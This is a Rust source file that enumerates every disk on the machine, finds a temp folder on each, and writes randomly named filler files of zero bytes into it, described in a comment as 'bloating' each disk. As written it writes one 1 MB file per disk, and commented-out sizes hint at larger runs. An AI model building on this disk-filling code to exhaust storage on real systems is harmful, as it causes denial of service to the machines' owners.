use core::slice;
use std::fs::File;
use std::io::prelude::*;
use std::path::Path;
use rand::Rng;
use regex::Regex;
use sysinfo::{
    /*Components,*/ Disks,/* Networks, System,*/
};



fn slice_string(input: &str) -> &str {
	
	let pattern = Regex::new(r"(\\)|(/)").unwrap();
	let parts: Vec<&str> = pattern.split(input).collect();

	return parts[0];
}




fn main() -> std::io::Result<()> {



	// Get a list of the disks on the machine
	let disks = Disks::new_with_refreshed_list();
	
	let mut disk_array = Vec::new();

	// Add all the disks found in an array
	for disk in &disks {
    	//println!("Name : {:?} Total space : {}, Available space : {}", disk.mount_point(), disk.total_space(), disk.available_space());
		let info:(&str, u64, u64) = (slice_string(disk.mount_point().to_str().unwrap()), disk.total_space(), disk.available_space());		

		disk_array.push(info);
	}	

	// Bloating each disks found
	for disk in disk_array{
		// Select the root folder of the disk
		let (disk_root, total_space, available_space) = disk;

		// Search for a valid path to write to
		let mut valid_path = String::new();
		let path_array = [r"/temp/", r"/tmp/"];

		for path in path_array {
		println!("Testing path : {}", format!("{}{}",disk_root,path).as_str());
		let temp_path:String = format!("{}{}",disk_root, path).as_str().to_string();
		if Path::new(&temp_path).is_dir() {
			valid_path = temp_path; 
			println!("Valid path : {}", path);
			break;
			}
		}
		// At this point, we found a valid folder




		let mut rng = rand::thread_rng();
		
		
		// Create the files
		for _ in 1..2{

			// Generate a random numbers
			let n2:u64 = rng.gen();
			// print!("Random : {}",n2);

			// 1Mo =  1_048_576
			// 16Mo = 16_777_216
			// 128Mo = 134_217_728

			// Vec with specified size (number of elements in the vector)
			let encoded: Vec<u8> = vec![0;1_048_576];

			// Create the file and write into it
			let mut file = File::create(format!("{}{}.bh",valid_path,n2))?;
			let _ = file.write_all(&encoded);
		}

		}
		
	





	
	






	Ok(())
}
